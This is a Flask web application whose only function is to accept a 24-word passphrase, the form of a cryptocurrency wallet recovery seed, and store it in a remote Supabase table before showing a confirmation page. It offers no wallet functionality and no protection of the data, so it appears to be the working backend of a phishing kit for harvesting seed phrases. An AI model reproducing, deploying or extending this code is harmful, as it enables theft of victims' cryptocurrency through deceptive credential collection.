from flask import Flask, render_template, request, redirect
import requests
import os
from datetime import datetime

app = Flask(__name__, static_folder='static', template_folder='.')

# Supabase config from environment variables
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
SUPABASE_TABLE = "passphrases_new"

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/passphrase')
def passphrase():
    return render_template("passphrase.html")

@app.route('/submit-passphrase', methods=["POST"])
def submit_passphrase():
    passphrase = request.form.get("passphrase", "").strip()
    words = passphrase.split()
    if len(words) != 24:
        return "Invalid passphrase. Must be 24 words.", 400

    # Save passphrase to Supabase
    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=representation"
    }

    payload = {
        "passphrase": passphrase,
        "timestamp": datetime.utcnow().isoformat()
    }

    try:
        response = requests.post(
            f"{SUPABASE_URL}/rest/v1/{SUPABASE_TABLE}",
            headers=headers,
            json=payload
        )
        if response.status_code not in [200, 201]:
            return f"Error saving passphrase: {response.text}", 500
    except Exception as e:
        return f"Exception occurred: {e}", 500

    return redirect("/confirmation")

@app.route('/confirmation')
def confirmation():
    return render_template("confirmation.html")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
